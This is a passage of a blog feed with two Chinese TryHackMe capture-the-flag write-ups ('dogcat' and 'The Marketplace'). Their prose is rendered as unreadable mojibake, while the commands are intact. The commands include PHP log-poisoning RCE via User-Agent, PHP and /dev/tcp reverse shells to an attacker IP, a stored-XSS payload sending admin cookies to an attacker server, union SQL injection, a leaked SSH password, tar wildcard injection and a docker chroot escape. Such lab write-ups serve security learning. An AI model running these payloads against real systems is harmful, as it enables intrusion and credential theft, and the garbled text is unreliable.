alt="image-20241018162837485"></p><p>ÁúãÊ∫êÁ†ÅÊØîËæÉÊ∏ÖÊô∞‰∏ÄÁÇπ</p><p>ËøôÈáåË≤å‰ººÊ≤°‰ªÄ‰πà‰ø°ÊÅØÔºåÊü•Áúã‰∏Ä‰∏ãÊó•Âøó</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?view=view=dog/../../../../../../../var/log/apache2/access.log&amp;ext=</span><br></pre></td></tr></table></figure><p>ÊúÄÁªàÊâæÂà∞‰∫Ü<code>apache2</code>ÁöÑÊó•Âøó</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018163529321-1675570605.png" alt="image-20241018163515318"></p><p>Âú®ÊúÄÂêéÂèëÁé∞Êàë‰ª¨ÁöÑÊìç‰Ωú‰ºöË¢´ËÆ∞ÂΩï‰∏ãÊù•ÔºåÂπ∂‰∏îËØ∑Ê±ÇÂ§¥ÁöÑ‰ø°ÊÅØ‰πü‰øùÂ≠ò‰∫Ü</p><p>Â∞ùËØïÊõ¥ÊîπËØ∑Ê±ÇÂ§¥ËØï‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018163851053-760002723.png" alt="image-20241018163836959"></p><p>Êàë‰ª¨Ëá™ÂÆö‰πâÁöÑËØ∑Ê±ÇÂ§¥Ë¢´ÂÜôÂÖ•Âà∞Êó•ÂøóÊñá‰ª∂‰∏≠‰∫ÜÔºåÂ∞ùËØïÂÜôÂÖ•php‰ª£Á†Å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.10.89.86/&quot;</span> -H <span class="string">&quot;User-Agent: &lt;?php system(&#x27;whoami&#x27;)?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018164041488-425159992.png" alt="image-20241018164027252"></p><p>ÊàêÂäüRCEÔºÅ</p><h1>Ëé∑ÂæóÂàùÂßãËÆøÈóÆÊùÉÈôê</h1><p>ÂÖàÂ∞ÜRCEÂÆåÂñÑ‰∏Ä‰∏ã</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://10.10.89.86/&quot;</span> -H <span class="string">&quot;User-Agent: &lt;?php system(\$_GET[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018165138954-1219496020.png" alt="image-20241018165124697"></p><p>ÂèØ‰ª•ÊâßË°åÂëΩ‰ª§ÔºåÊàë‰ª¨Â∞±Â∞ùËØïÂèçÂºπshellÔºåÂÖàÂª∫Á´ã‰∏™ÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018164149123-438306846.png" alt="image-20241018164135561"></p><p>ÊâßË°å‰∏Ä‰∏ãÂèçÂºπshellÂëΩ‰ª§ÔºàÊ≥®ÊÑèË¶ÅurlÁºñÁ†ÅÔºâ</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;10.14.90.122&quot;</span>, <span class="number">8888</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181125748-1188823251.png" alt="image-20241018181111610"></p><p>ÊàêÂäüËé∑ÂèñÂàùÂßãÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181201855-1454053211.png" alt="image-20241018181148117"></p><p>Âú®ÂΩìÂâçÈ°µÈù¢ÊâæÂà∞<code>flag.php</code></p><h1>ÊèêÂçáËá≥rootÊùÉÈôê</h1><p>ÂÖàÊâæ‰∏Ä‰∏ãflagÁöÑ‰ΩçÁΩÆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;*flag*&quot;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181620922-1758860058.png" alt="image-20241018181607197"></p><p>ÊâæÂà∞flag2</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018181644383-1741156501.png" alt="image-20241018181630748"></p><p><code>sudo -l</code>Êü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183042873-653679545.png" alt="image-20241018183028748"></p><p>ÂèëÁé∞<code>env</code>ÂëΩ‰ª§ÂÖ∑ÊúârootÊùÉÈôêÔºå‰ΩøÁî®<code>env</code>ÂëΩ‰ª§ÊèêÊùÉ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183104360-4899350.png" alt="image-20241018183050727"></p><p>Ëé∑ÂæórootÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018183127751-2047869555.png" alt="image-20241018183114104"></p><p>Âú®<code>/root</code>‰∏ãÊâæÂà∞<code>flag3.txt</code></p><h1>dockerÈÄÉÈÄ∏</h1><p>Âú®Ê†πÁõÆÂΩï‰∏≠ÊâæÂà∞<code>.dockerenv</code>Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018185123618-1506946845.png" alt="image-20241018185109777"></p><p>ÂèØÁü•Êàë‰ª¨Âú®dockerÂÜÖ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018185222092-292349124.png" alt="image-20241018185208376"></p><p>‰ªîÁªÜÁøªÊâæÊñá‰ª∂ÂêéÂèëÁé∞‰ª•‰∏äÂÜÖÂÆπÔºå‰ªîÁªÜÊü•Áúã‰∏Ä‰∏ãÔºåÂèëÁé∞ÂÉèÊòØÂ§á‰ªΩÊñá‰ª∂ÁöÑÂëΩ‰ª§ÔºåËøáÊÆµÊó∂Èó¥Âêé‰ºöÂèëÁé∞<code>backup.tar</code>Êñá‰ª∂ÁöÑ‰øÆÊîπÊó∂Èó¥ÊîπÂèò‰∫ÜÔºåÊé®Êñ≠Âá∫ÂèØËÉΩÊ≠£Âú®ÊâßË°å‰∏Ä‰∏™<code>cron</code>‰ªªÂä°</p><p>Êàë‰ª¨ÂèØ‰ª•Â∞ùËØïÂÜôÂÖ•ÂèçÂºπshellÁöÑÂëΩ‰ª§ÔºåÂπ∂‰ª•‰∏ªÊú∫‰∏äÁöÑ root Ë∫´‰ªΩËé∑Âèñ shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.14.90.122/8889 0&gt;&amp;1&quot;</span> &gt;&gt; backup.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018190855406-938924442.png" alt="image-20241018190841293">‰∏ªÊú∫ËøõË°åÁõëÂê¨ÔºåËøáÊÆµÊó∂Èó¥ÂêéÊàë‰ª¨Ëé∑ÂèñÂà∞‰∫Ü‰∏ªÊú∫ÁöÑshell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018191712386-1712812147.png" alt="image-20241018191658563"></p><p>ÊàêÂäüËé∑Âèñ‰∏ªÊú∫shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241018191743754-679623711.png" alt="image-20241018191730005"></p><p>Âú®<code>/root</code>ÁõÆÂΩïÊâæÂà∞ÊúÄÂêé‰∏Ä‰∏™flag</p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãdogcat</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-The Marketplace</title>
    <link href="https://www.fomal.cc/posts/aad874a7.html"/>
    <id>https://www.fomal.cc/posts/aad874a7.html</id>
    <published>2024-10-17T07:31:23.000Z</published>
    <updated>2024-10-27T12:35:31.898Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.113.205</p><p>ÊîªÂáªÊú∫ipÔºö10.14.90.122</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap -min-rate 10000 -A -sV -sC -p- 10.10.113.205</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154217241-1022693500.png" alt="image-20241017154202881"></p><p>ÂèëÁé∞Êúâ22Ôºå80Ôºå32768Á´ØÂè£ÂºÄÊîæ</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154322531-882372758.png" alt="image-20241017154309971"></p><p>ÂÖàÊâ´ÊèèÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.113.205/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017154759524-796732244.png" alt="image-20241017154746973"></p><p>ÂÖàÂàõÂª∫‰∏Ä‰∏™ÊôÆÈÄöÁî®Êà∑Êü•Áúã‰∏Ä‰∏ãÁõ∏ÂÖ≥Ë∑ØÂæÑÔºåÂæóÂà∞‰ª•‰∏ãÁªìÊûúÔºö</p><ul><li><code>/admin</code> ÈúÄË¶ÅÁôªÂΩïËÆ§ËØÅÊâçËÉΩÊü•Áúã</li><li><code>/signup</code> Ê≥®ÂÜå</li><li><code>/login</code> ÁôªÂΩï</li><li><code>/new</code> ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÂàóË°®</li><li><code>/messages</code> Êü•ÁúãÊ∂àÊÅØ</li><li><code>/contact/michael</code> ËÅîÁ≥ªÂàóË°®‰ΩúËÄÖ</li><li><code>/item/1</code> Êü•ÁúãÂÖ∑‰ΩìÂàóË°®ÁöÑËØ¶ÁªÜ‰ø°ÊÅØ</li><li><code>/report/1</code> ÂêëÁÆ°ÁêÜÂëòÊä•ÂëäÂàóË°®</li></ul><h1>XSSÈíìÈ±ºË∂äÊùÉ</h1><p>ÊµãËØïÂêéÂèëÁé∞Âú®ÂàõÂª∫Êñ∞ÂàóË°®ÁöÑÊó∂ÂÄôÔºå<code>Description</code>ÁöÑÂÄºÂ≠òÂú®Â≠òÂÇ®Âûãxss</p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160338454-1233589541.png" alt="image-20241017160325926"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160357257-693709284.png" alt="image-20241017160344536"></p><p>ÂèØ‰ª•Âà©Áî®xssÂæóÂà∞cookieÁ≠âÂÖ≥ÈîÆ‰ø°ÊÅØ</p><p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160619411-1869855713.png" alt="image-20241017160607215"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017160525019-1199388518.png" alt="image-20241017160512805"></p><p>ÂèëÁé∞cookieÁöÑÊ†ºÂºèÂÉèÊòØjwtÔºåÂèØ‰ª•‰ΩøÁî®<a href="https://jwt.io/">Âú®Á∫øÂ∑•ÂÖ∑</a>Êü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017161223991-2004112504.png" alt="image-20241017161211306"></p><p>ÊÉ≥Â∞ùËØïÂ∞Ücookie‰º™ÈÄ†ÊàêadminÔºå‰ΩÜÊòØÂ§±Ë¥•‰∫Ü</p><p>Êàë‰ª¨ÁöÑÂïÜÂìÅÂ≠òÂú®Â≠òÂÇ®ÂûãXSSÊºèÊ¥ûÔºåÈÇ£‰πàÊàë‰ª¨ÂèØ‰ª•Âú®Êàë‰ª¨ÁöÑÂïÜÂìÅÈ°µÈù¢‰Ωú‰∏∫ÈíìÈ±ºÈ°µÈù¢Ôºå‰∏æÊä•Ëá™Â∑±ÁöÑÂïÜÂìÅËØ±ÂØºÁÆ°ÁêÜÂëòÂÆ°Ê†∏ÔºåÁÑ∂ÂêéÂæóÂà∞ÁÆ°ÁêÜÂëòÁöÑCookieÔºåÊèêÂèñ‰ªñÁöÑToken</p><ul><li>È¶ñÂÖàÔºåÂª∫Á´ãÁõëÂê¨Áî®‰∫éËé∑Âèñcookie</li></ul><p><code>python -m http.server</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162043360-56155628.png" alt="image-20241017162030691"></p><ul><li>ÁÑ∂ÂêéÊûÑÈÄ†XSSÈíìÈ±ºÈ°µÈù¢ÔºåÂΩìÊúâ‰∫∫ËÆøÈóÆÁöÑÊó∂ÂÄôËé∑Âèñ‰ªñÁöÑcookie</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="variable language_">this</span>.<span class="property">src</span>=<span class="string">&quot;http://10.14.90.122:8000/?1=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code> Áî®‰∫éÂä†ËΩΩÂõæÂÉè„ÄÇ</p><p><code>src=x</code> ËÆæÁΩÆ‰∏Ä‰∏™Êó†ÊïàÁöÑÂõæÂÉèÊ∫êÔºåÈÄöÂ∏∏‰ºöÂØºËá¥Âä†ËΩΩÂ§±Ë¥•„ÄÇ</p><p><code>onerror</code> ÂΩìÂõæÂÉèÂä†ËΩΩÂ§±Ë¥•Êó∂Ëß¶ÂèëÁöÑ‰∫ã‰ª∂„ÄÇ</p><p><code>this.src</code> Âú®ÂõæÂÉèÂä†ËΩΩÂ§±Ë¥•Êó∂ÔºåÂ∞ÜÂõæÂÉèÁöÑ <code>src</code> Â±ûÊÄßËÆæÁΩÆ‰∏∫‰∏Ä‰∏™ URLÔºåÂç≥‰∏∫Êàë‰ª¨ÊûÑÈÄ†ÁöÑ‰∏Ä‰∏™Êñ∞ÁöÑURLÂ∞ÜÂΩìÂâçÈ°µÈù¢ÁöÑ cookies ‰Ωú‰∏∫Êü•ËØ¢ÂèÇÊï∞Ê∑ªÂä†Âà∞ËØ• URL ‰∏≠</p><p><code>document.cookie</code> Ëé∑ÂèñÂΩìÂâçÈ°µÈù¢ÁöÑ cookies</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162252922-660876351.png" alt="image-20241017162240509"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162337370-966054914.png" alt="image-20241017162324966"></p><p>ËøôÊó∂Êàë‰ª¨‰ºöÊî∂Âà∞Â§ßÈáèÁöÑcookieÔºåÁé∞Âú®‰∏æÊä•ÂïÜÂìÅ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162452408-1679239075.png" alt="image-20241017162440113"></p><p>ÂèëÁé∞ÊúâÂá†Êù°‰∏ç‰∏ÄÊ†∑ÁöÑÔºåÂàÜÊûê‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162542667-494681323.png" alt="image-20241017162530429"></p><p>ÂèëÁé∞ÊòØadminÁöÑcookieÔºåÊõ¥Êç¢cookie</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162715518-1364164542.png" alt="image-20241017162703243"></p><p>Êõ¥Êç¢ÂêéÂà∑Êñ∞È°µÈù¢</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162747921-460184614.png" alt="image-20241017162735330"></p><p>ÂèëÁé∞Â§ö‰∫Ü‰∏™<code>Administrator panel</code>ÔºåÁé∞Âú®Â∑≤ÁªèÊàêÂäüË∂äÊùÉÂà∞admin‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017162826902-308858830.png" alt="image-20241017162814445"></p><p>ÁÇπÂáªÂêéËé∑Âæóflag</p><h1>SQLÊ≥®ÂÖ•Êãøshell</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163022484-117763262.png" alt="image-20241017163010291"></p><p>Èöè‰æøÁÇπÂáª‰∏Ä‰∏™Áî®Êà∑ÂèëÁé∞ÊòØÈÄöËøáget‰º†ÂèÇÔºå<code>user</code>ÊòØÂèÇÊï∞ËøõË°åÊü•ËØ¢ÁöÑÔºåÂà§Êñ≠‰∏Ä‰∏ãÊòØÂê¶ÊúâsqlÊ≥®ÂÖ•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163149364-625326231.png" alt="image-20241017163137167"></p><p>ÂèØ‰ª•Ê≥®ÂÖ•</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163317723-1348407264.png" alt="image-20241017163305552"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163417336-620897975.png" alt="image-20241017163404953"></p><p>Âà§Êñ≠Âá∫Â≠óÊÆµÊï∞ÊòØ4</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163452909-662759722.png" alt="image-20241017163440726"></p><p>ÂèëÁé∞ÂõûÊòæ‰ΩçÁΩÆÊúâ1Âíå2</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163650303-2129390896.png" alt="image-20241017163637823"></p><p>ÊâæÂà∞Êï∞ÊçÆÂ∫ìÂêç<code>marketplace</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;marketplace&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163725041-1630260119.png" alt="image-20241017163712870"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;marketplace&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;messages&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163755877-1253692693.png" alt="image-20241017163743652"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">10.10</span><span class="number">.113</span><span class="number">.205</span><span class="operator">/</span>admin?<span class="keyword">user</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> concat_ws(<span class="string">&#x27;,&#x27;</span>,id,is_read,message_content,user_from,user_to),<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> marketplace.messages limit <span class="number">0</span>,<span class="number">1</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017163858140-647301558.png" alt="image-20241017163845970"></p><p>ÊâæÂà∞‰∫Ü<code>jake</code>Áî®Êà∑ÁöÑsshÂØÜÁ†Å<code>@b_ENXkGYUCAv3zJ</code></p><p>sshÁôªÂΩï</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jake@10.10.113.205</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164154918-51511059.png" alt="image-20241017164142284"></p><p>ÁôªÈôÜÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164213325-995265159.png" alt="image-20241017164201069"></p><p>Âú®ÂΩìÂâçÁõÆÂΩïÊâæÂà∞<code>user.txt</code></p><h1>ÊèêÂçáËá≥rootÊùÉÈôê</h1><h2 id="Ê®™ÂêëÁßªÂä®">Ê®™ÂêëÁßªÂä®</h2><p>ÁªèÂÖ∏<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164349253-2140029166.png" alt="image-20241017164336681"></p><p>ÂèëÁé∞Êàë‰ª¨ÂèØ‰ª•‰∏ç‰ΩøÁî®ÂØÜÁ†Å‰ª•michaelÁöÑË∫´‰ªΩËøêË°å<code>/opt/backups/backup.sh</code>ÔºåÊü•Áúã‰∏Ä‰∏ã</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/backups/backup.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017164623416-1133329500.png" alt="image-20241017164611144"></p><p>ËøôÊòØ‰∏Ä‰∏™ÂéãÁº©Â§á‰ªΩÂΩìÂâçÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂ÁöÑËÑöÊú¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf /opt/backups/backup.tar *</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•Áî®tarËøõË°åÊèêÊùÉ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=/bin/sh</span><br></pre></td></tr></table></figure><p><code>/dev/null</code> ÁâπÊÆäÁöÑË∑ØÂæÑÔºåÂÜôÂÖ•ËØ•Êñá‰ª∂ÁöÑÊï∞ÊçÆÈÉΩ‰ºöË¢´‰∏¢ÂºÉÔºå‰ΩÜËÑöÊú¨‰∏≠Â∑≤ÁªèÂÆö‰πâ‰∫ÜË∑ØÂæÑÊâÄ‰ª•Êàë‰ª¨‰∏çÁî®ÁÆ°</p><p><code>--checkpoint=1</code> Âú®ÂΩíÊ°£ËøáÁ®ã‰∏≠ÊØèÂ§ÑÁêÜ‰∏Ä‰∏™Êñá‰ª∂Êó∂ÔºåÁîüÊàê‰∏Ä‰∏™Ê£ÄÊü•ÁÇπ„ÄÇËøô‰∏™ÈÄâÈ°πÈÄöÂ∏∏Áî®‰∫éÈïøÊó∂Èó¥ËøêË°åÁöÑ tar Êìç‰Ωú„ÄÇ</p><p><code>--checkpoint-action=exec=/bin/sh</code> Âú®ÊØè‰∏™Ê£ÄÊü•ÁÇπËß¶ÂèëÊó∂ÊâßË°åÊåáÂÆöÁöÑÂëΩ‰ª§„ÄÇËøôÈáåÊåáÂÆöÁöÑÂëΩ‰ª§ÊòØ <code>/bin/sh</code>ÔºåÂç≥ÂêØÂä®‰∏Ä‰∏™Êñ∞ÁöÑ shell„ÄÇ</p><p>Âè™Ë¶ÅËÉΩÂ§üËÆ©<code>--checkpoint=1</code>Âíå<code>--checkpoint-action=exec=sh</code>ËøêË°åËµ∑Êù•Â∞±Ë°å‰∫ÜÔºåÈÇ£‰πàÊàë‰ª¨Âè™Áî®ÂàõÂª∫‰∏§‰∏™Âêç‰∏∫<code>--checkpoint=1</code>Âíå<code>--checkpoint-action=exec=sh</code>ÁöÑÊñá‰ª∂Â∞±Ë°å‰∫Ü</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; shell.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; <span class="string">&quot;--checkpoint-action=exec=sh shell.sh&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; --checkpoint=1</span><br><span class="line"><span class="built_in">chmod</span> 777 backup.tar</span><br><span class="line">sudo -u michael /opt/backups/backup.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017183620069-1667799123.png" alt="image-20241017183604622"></p><p>ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØË¶ÅÂ∞Ü<code>backup.tar</code>ÊùÉÈôêËÆæÁΩÆÊàêËÉΩÂÖÅËÆ∏ÂÖ∂‰ªñÁî®Êà∑ÂèØ‰ª•ËÆøÈóÆÁöÑÊùÉÈôê</p><p>Áé∞Âú®Â∞±ÁßªÂä®Âà∞<code>michael</code>ÊùÉÈôê</p><h2 id="ÊèêÊùÉËá≥root">ÊèêÊùÉËá≥root</h2><p><code>id</code>Áúã‰∏ãÊùÉÈôêÂÖà</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017183927283-989168472.png" alt="image-20241017183913322"></p><p>ÂèëÁé∞Êúâ‰∏™dockerÊùÉÈôê</p><p>Âà©Áî®dockerÊèêÊùÉ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --<span class="built_in">rm</span> -it alpine <span class="built_in">chroot</span> /mnt sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017184042987-2077176883.png" alt="image-20241017184029556"></p><p>ÊèêÊùÉÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241017184117724-885437577.png" alt="image-20241017184104249"></p><p>Âú®<code>/root</code>‰∏ãÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãThe Marketplace</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
